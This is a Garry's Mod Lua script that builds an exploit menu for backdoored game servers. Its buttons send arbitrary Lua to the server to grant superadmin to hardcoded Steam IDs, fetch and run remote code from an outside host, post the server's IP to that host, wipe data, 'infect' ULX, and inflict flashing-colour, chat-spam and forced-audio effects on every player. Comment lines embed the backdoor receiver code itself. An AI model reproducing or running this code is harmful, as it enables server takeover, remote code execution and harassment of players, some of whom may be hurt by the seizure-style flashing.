--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Functions to get shit going
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]

netKey = "filter" 
function IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end

 
 


--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Main Menu (Background stuff) 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]

--[[---------------------------------------------------------
    Main Frame
-----------------------------------------------------------]]
-- Con-Commnad for menu--
concommand.Add("orbitmenu",function( )
    local Menu = vgui.Create("DFrame")
        Menu:SetSize(520,470)
        Menu:SetTitle("")
        Menu:Center()
        Menu:MakePopup()
        Menu.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,Menu:GetWide(),Menu:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,Menu:GetWide()-4,Menu:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,Menu:GetWide()-8,Menu:GetTall()-8)
        end
--[[---------------------------------------------------------
    Sheets - Main
-----------------------------------------------------------]]
    local tabs = vgui.Create( "DPropertySheet", Menu)
        tabs:SetSize(250,450)
        tabs:SetPos(10,20)
        tabs.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,0)
        surface.DrawRect(0,0,tabs:GetWide(),tabs:GetTall())
        end
    local tabs2 = vgui.Create( "DPropertySheet", Menu)
        tabs2:SetSize(250,450)
        tabs2:SetPos(260,20)
        tabs2.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,0)
        surface.DrawRect(0,0,tabs2:GetWide(),tabs2:GetTall())
        end 
--[[---------------------------------------------------------
    Sheets - Draw Stuff
-----------------------------------------------------------]]
local drawHUD = vgui.Create("DPanel")
    drawHUD.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        --Outline
        surface.SetDrawColor(127,0,255,255)
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        --Main back
        surface.SetDrawColor(51,0,102,255)
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
tabs:AddSheet( "Draw Stuff", drawHUD, "icon16/picture_edit.png")


--[[---------------------------------------------------------
    Sheets - Play Songs
-----------------------------------------------------------]]
local playSongs = vgui.Create("DPanel")
    playSongs.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        --Outline
        surface.SetDrawColor(127,0,255,255)
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        --Main back
        surface.SetDrawColor(51,0,102,255)
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
tabs:AddSheet( "Play Songs", playSongs, "icon16/control_play_blue.png")


--[[---------------------------------------------------------
    Sheets - Stripper
-----------------------------------------------------------]]

local strip = vgui.Create("DPanel")
    strip.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        --Outline
        surface.SetDrawColor(127,0,255,255)
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        --Main back
        surface.SetDrawColor(51,0,102,255)
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
tabs2:AddSheet( "Stripper", strip, "icon16/error_add.png")


--[[---------------------------------------------------------
    Sheets - Hacks
-----------------------------------------------------------]]

local hacks = vgui.Create("DPanel")
    hacks.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drawHUD:GetWide(),drawHUD:GetTall())
        --Outline
        surface.SetDrawColor(127,0,255,255)
        surface.DrawRect(2,2,drawHUD:GetWide()-4,drawHUD:GetTall()-4)
        --Main back
        surface.SetDrawColor(51,0,102,255)
        surface.DrawRect(4,4,drawHUD:GetWide()-8,drawHUD:GetTall()-8)
    end
tabs2:AddSheet( "Hacks", hacks, "icon16/cross.png")





--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Drawing anything
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Draw Stuff
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
local HerthButton = vgui.Create("DButton", drawHUD)
        HerthButton:SetVisible(false)
        HerthButton:SetSize(105,75)
        HerthButton:SetPos(10,350)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Middle Text")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)   
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:Center() hud:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/seized2.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()   
        end
    local TopLeft = vgui.Create("DButton", drawHUD)
        TopLeft:SetSize(105,75)
        TopLeft:SetVisible(false)
        TopLeft:SetTextColor(Color(255,255,255))
        TopLeft:SetText("Top Left Spinner")
        TopLeft.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        TopLeft.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
        end
        local BottomLeft = vgui.Create("DButton", drawHUD)
        BottomLeft:SetSize(105,75)
        BottomLeft:SetVisible(false)
        BottomLeft:SetTextColor(Color(255,255,255))
        BottomLeft:SetText("Bottom Left Spinner")
        BottomLeft.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        BottomLeft.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
        end
        local TopRight = vgui.Create("DButton", drawHUD)
        TopRight:SetSize(105,75)
        TopRight:SetVisible(false)
        TopRight:SetTextColor(Color(255,255,255))
        TopRight:SetText("Top Right Spinner")
        TopRight.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        TopRight.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
        end
    local BottomRight = vgui.Create("DButton", drawHUD)
        BottomRight:SetSize(105,75)
        BottomRight:SetVisible(false)
        BottomRight:SetTextColor(Color(255,255,255))
        BottomRight:SetText("Bottom Right Spinner")
        BottomRight.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        BottomRight.DoClick = function ()
        net.Start(netKey)
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/spin.gif\")]])end")
        net.WriteBit(1)
        net.SendToServer()
        end
    local Earthquake = vgui.Create("DButton", drawHUD)
        Earthquake:SetSize(105,75)
        Earthquake:SetPos(260,650)
        Earthquake:SetVisible(false)
        Earthquake:SetTextColor(Color(255,255,255))
        Earthquake:SetText("EarthquakeRP")
        Earthquake.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        Earthquake.DoClick = function()
        net.Start(netKey)
        net.WriteString("BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local Effect1 = vgui.Create("DButton", drawHUD)
        Effect1:SetSize(105,75)
        Effect1:SetPos(10,550)
        Effect1:SetVisible(false)
        Effect1:SetTextColor(Color(255,255,255))
        Effect1:SetText("Effect1")
        Effect1.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        Effect1.DoClick = function()
        net.Start(netKey)
        net.WriteString("BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local Effect2 = vgui.Create("DButton", drawHUD)
        Effect2:SetSize(105,75)
        Effect2:SetPos(135,550)
        Effect2:SetVisible(false)
        Effect2:SetTextColor(Color(255,255,255))
        Effect2:SetText("Effect2")
        Effect2.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        Effect2.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://nebulanetworks.x10host.com/home/songs/skel2.gif\")]])")
        net.WriteBit(1)
        net.SendToServer() 
        end
    local Effect3 = vgui.Create("DButton", drawHUD)
        Effect3:SetSize(105,75)
        Effect3:SetPos(260,550)
        Effect3:SetVisible(false)
        Effect3:SetTextColor(Color(255,255,255))
        Effect3:SetText("Effect3")
        Effect3.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,255,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main Back util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)
        surface.SetDrawColor(0,0,73,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        Effect3.DoClick = function()
        net.Start(netKey)   
        net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]])end")
        net.WriteBit(1)
        net.SendToServer() 
        end


    local DScrollPanel = vgui.Create( "DScrollPanel", drawHUD )
    DScrollPanel:Dock( FILL )
      local doAll = DScrollPanel:Add("DButton")
        doAll:SetSize(225,25)
        doAll:SetPos(5,5)
        doAll:SetTextColor(Color(255,255,255))
        doAll:SetText("Draw All The Memes")
        doAll.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,doAll:GetWide(),doAll:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,doAll:GetWide()-4,doAll:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,doAll:GetWide()-8,doAll:GetTall()-8)
        end
        doAll.DoClick = function()
            HerthButton.DoClick()
            TopLeft.DoClick()
            TopRight.DoClick()
            BottomLeft.DoClick()
            BottomRight.DoClick()
            Earthquake.DoClick()
            Effect1.DoClick()
            Effect2.DoClick()
            Effect3.DoClick()
        end



    local HerthButton = DScrollPanel:Add( "DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*3+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Add YYY to Admin")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function ()
        net.Start(netKey)
        net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:202597433\", \"superadmin\")")
        net.WriteBit(1)
        net.SendToServer() 
        end
    local HerthButton = DScrollPanel:Add( "DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*4+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Add ZZZ to Admin")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function ()
        net.Start(netKey)
        net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:148935233\", \"superadmin\")")
        net.WriteBit(1)
        net.SendToServer() 
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*5+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Seize Chat")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)
        net.WriteString("timer.Create( \"memer\", 0.2, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"http://team-orbit.club\")]]) end)")
        net.WriteBit(1)
        net.SendToServer()
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*6+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Stop Seize Chat")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)
        net.WriteString("timer.Stop( \"memer\")")
        net.WriteBit(1)
        net.SendToServer()
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*7+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Teleport All")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) end" )
        net.WriteBit(1)
        net.SendToServer()
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*8+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Model All")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
        net.WriteBit(1)
        net.SendToServer()
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*9+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Http://Fetch(Use this for belows)")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        net.Start(netKey)
        net.WriteString("RunConsoleCommand(\"ulx\", \"luarun\", \"http.Fetch('http://teamorbit.x10.bz/lua/gas.lua',function(b)RunString(b)end,nil)\")")
        net.WriteBit(1)
        net.SendToServer()            
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*10+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Fuck The Server")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
            RunConsoleCommand("smashconsole")
            RunConsoleCommand("rektmodels")
            RunConsoleCommand("wipedata")           
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*11+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Disco")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
            RunConsoleCommand("disco")            
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*12+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Hell")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
            RunConsoleCommand("hell")            
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*13+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Nuke ULX")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
            RunConsoleCommand("nukeulx")          
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*14+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Infect Servers ULX")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
            RunConsoleCommand("ulxconfig")         
        end
    local HerthButton = DScrollPanel:Add("DButton")
        HerthButton:SetSize(225,25)
        HerthButton:SetPos(5,27*15+5)
        HerthButton:SetTextColor(Color(255,255,255))
        HerthButton:SetText("Save Server to DataBase")
        HerthButton.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,HerthButton:GetWide(),HerthButton:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,HerthButton:GetWide()-4,HerthButton:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,HerthButton:GetWide()-8,HerthButton:GetTall()-8)
        end
        HerthButton.DoClick = function()
        http.Post("http://teamorbit.x10.bz/lua/data/makefolders.php",{a=string.sub( game.GetIPAddress(), 1, 10 ),b="cfg"})       
        end





--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Songs
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
    local DScrollPanel = vgui.Create( "DScrollPanel", playSongs )
    DScrollPanel:Dock( FILL )


local drose = DScrollPanel:Add( "DButton", Song )
        drose:SetSize(225,25)
        drose:SetPos(5,5)
        drose:SetTextColor(Color(255,255,255))
        drose:SetText("TTS Seized")
        drose.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        drose.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/seized.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local Orbit = DScrollPanel:Add( "DButton", Song )
        Orbit:SetSize(225,25)
        Orbit:SetTextColor(Color(255,255,255))
        Orbit:SetPos(5,32)
        Orbit:SetText("Kodak Transportin")
        Orbit.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        Orbit.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/trans.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local OW = DScrollPanel:Add( "DButton", Song )
        OW:SetSize(225,25)
        OW:SetTextColor(Color(255,255,255))
        OW:SetPos(5,59)
        OW:SetText("Matt OX Overhelming")
        OW.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
        end
        OW.DoClick = function()
        net.Start(netKey)   
        net.WriteString("BroadcastLua([[sound.PlayURL( \"http://nebulanetworks.x10host.com/home/songs/over.mp3\", \"mono\", function()end )]])")
        net.WriteBit(1)
        net.SendToServer()
        end
    local drose = DScrollPanel:Add( "DButton", Song )
        drose:SetSize(225,25)
        drose:SetTextColor(Color(255,255,255))
        drose:SetPos(5,86)
        drose:SetText("DRose Lil Pump")
        drose.Paint = function()
        --Black outline
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(0,0,drose:GetWide(),drose:GetTall())
        --Outline
        surface.SetDrawColor(0,255,128,255)
        surface.DrawRect(2,2,drose:GetWide()-4,drose:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,51,25,255)
        surface.DrawRect(4,4,drose:GetWide()-8,drose:GetTall()-8)
